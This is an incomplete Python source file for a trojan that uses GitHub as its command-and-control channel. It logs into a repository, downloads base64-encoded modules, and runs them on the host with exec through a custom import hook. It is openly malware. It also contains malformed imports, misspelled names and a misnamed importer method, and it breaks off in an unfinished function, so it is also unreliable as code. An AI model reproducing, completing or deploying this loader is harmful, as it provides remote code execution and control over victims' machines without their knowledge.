import json,base64,sys,time,imp,random.threading,Queue.os

from github3 import login

trojan_id="abc"

trojan_congfig="{}.json".format(trojan_id)
data_path="data/{}/".format(trojan_id)
trojan_modules=[]

task_queue=Queue.Queue()
configured=False

class GitImporter:
    def __init__(self):
        self.current_module_code=""
    
    def find_modules(self,fullname,path=None):
        if configured:
            print("[*] Attempting to recieve {}".format(fullname))
            new_library=get_file_contents("modulues/{}".format(fullname))
            if new_library is not None:
                self.current_module_code=base64.b64decode(new_library)
                return self
        return None
    def load_module(self,name):
        module=imp.new_module(name)
        exec self.current_module_code in module.__dict__
        sys.modules[name] =module
        return module

def connect_to_github():
    gh=login(username='',password='')
    repo=gh.repository("","")
    branch=repo.branch("master")
    
    return gh,repo,branch

def get_file_contents(filepath):
    gh,repo,branch=connect_to_github()
    tree=branch.commit.commit.tree.recurse()

    for filename in tree.tree:
        if filepath in filename.path:
            print("[*] Found in file {}".format(filepath))
            blob=repo.blob(filename._json_data['sha'])
            return blob.content
    return None

def get_trojan_config():
    global configured

